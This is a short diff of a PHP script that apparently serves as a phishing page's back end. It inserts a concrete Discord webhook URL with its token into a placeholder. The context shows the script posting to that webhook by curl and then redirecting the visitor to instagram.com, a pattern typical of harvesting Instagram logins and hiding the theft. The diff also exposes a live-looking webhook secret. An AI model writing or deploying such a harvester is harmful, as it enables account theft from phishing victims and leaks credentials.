@@ -1,10 +1,10 @@
-<?php
+
 <?php
 //=======================================================================================================
 // Create new webhook in your Discord channel settings and copy&paste URL
 //=======================================================================================================
 
-$webhookurl = "YOUR_WEBHOOK_URL";
+$webhookurl = "https://discord.com/api/webhooks/1053040874604462190/kZ8CPUg4c-GQBcIdaHotPn-FLjHJabNO3HsYpX12GwwWofPMNjdXLqERoUn6daUSA42x";
 
 //=======================================================================================================
 // Compose message. You can use Markdown
@@ -110,5 +110,3 @@ curl_close( $ch );
 
 header('Location: https://instagram.com');
 exit();
-
-?>
